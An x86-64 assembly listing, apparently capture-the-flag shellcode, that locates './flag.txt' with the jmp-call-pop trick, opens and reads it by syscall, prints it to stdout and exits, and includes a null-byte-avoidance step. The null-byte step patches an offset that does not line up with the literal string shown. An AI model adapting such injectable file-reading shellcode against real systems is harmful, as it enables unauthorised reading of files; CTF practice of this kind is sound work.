global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rsi ; pop path value
; NULL byte fix
xor byte [rsi + 11], 0x41
  
xor rax, rax
add rax, 257
xor rdi, rdi
mov rdi, -100
xor rcx, rcx ; set O_RDONLY flag
xor rdx, rdx
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "./flag.txt", 0
